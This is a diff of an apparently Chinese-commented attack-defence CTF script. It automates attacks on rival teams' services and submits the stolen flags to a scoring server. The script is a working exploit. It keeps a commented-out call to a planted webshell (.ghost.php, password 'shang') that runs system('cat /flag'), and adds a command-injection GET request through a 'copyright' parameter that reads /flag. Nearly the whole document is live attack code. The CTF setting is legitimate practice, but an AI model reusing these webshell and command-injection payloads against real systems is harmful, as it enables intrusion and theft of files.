@@ -18,15 +18,19 @@ import json
 #############################################################
 
 
-def attack(ip, port):
+def attack(ip, port):  # 命令执行漏洞
     try:
         ################## 构造payload ################
-        flag_data = {'pass': 'shang', 'a': "system('cat /flag');"}
-        r = requests.post("http://" + ip + ":" + port + "/sqlgunadmin/kindedit/attached/20220715/.ghost.php",
-                          data=flag_data, timeout=10)
-        # # 正则匹配flag
+        ################## post 方法 ##################
+        # flag_data = {'pass': 'shang', 'a': "system('cat /flag');"}
+        # r = requests.post("http://" + ip + ":" + port + "/sqlgunadmin/kindedit/attached/20220715/.ghost.php",
+        #                   data=flag_data, timeout=10)
+        ################## get 方法 ###################
+        r = requests.get("http://" + ip + ":" + port +
+                         "/index.php?copyright=cat /flag")
+        # 正则匹配flag
         flag = re.search(r'lhsw\{.*\}', r.text).group()
-        # #打印攻击结果
+        # 打印攻击结果
         print("[\033[0;36mFLAGS\033[0m] " + ip + ":" + port +
               "\033[0m Flag is : \033[0;36m" + flag + "\033[0m")
         return flag
@@ -37,7 +41,7 @@ def attack(ip, port):
         return False
 
 
-def submit(ip, port, flag_text):
+def submit(ip, port, flag_text):  # 提交flag
     try:
         # 构造submit flag 参数
         submit_url = 'http://192.168.15.80:19999/api/flag'
@@ -48,8 +52,13 @@ def submit(ip, port, flag_text):
         # json格式化flag
         flag_data = json.dumps({"flag": flag_text})
         r = requests.post(submit_url, data=flag_data, headers=flag_header)
-        print("[\033[0;32mSUCCE\033[0m] " +
-              ip + ":" + port + " Submit success")
+        submit_re = re.search(r'\"msg\"\:\".*\"', r.text).group()
+        if submit_re.find('success') != -1:
+            print("[\033[0;32mSUCCE\033[0m] " +
+                  ip + ":" + port + ' ' + submit_re)
+        else:
+            print("[\033[0;35mFAIL!\033[0m] " +
+                  ip + ":" + port + ' ' + submit_re)
     except Exception as e:
         print(
             "[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port + "\033[0m Submit failed, because: \033[0;31m" + str(
@@ -60,7 +69,7 @@ def submit(ip, port, flag_text):
 def main():
     try:
         # 一轮中所有队伍
-        for i in range(8801, 8806):
+        for i in range(8801, 8807):
             self_id = 8802  # 跳过自己的队伍ip/端口
             if i == self_id:
                 continue
@@ -69,10 +78,11 @@ def main():
             # 开始攻击
             flag_text = attack(server_ip, str(i))
             # 提交flag
-            submit(server_ip, str(i), flag_text)
+            if flag_text != False:  # 判断成功提交
+                submit(server_ip, str(i), flag_text)
             time.sleep(1)
         print("[\033[0;30;43mROUND\033[0m] " + time.strftime("%Y-%m-%d %H:%M:%S",
-              time.localtime()) + " Round attack end, waitting for next round")
+              time.localtime()) + " Round attack end, waitting for next round.")
     except Exception as e:
         print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mMain function error, because: " + str(e) + "\033[0m")
         exit(0)
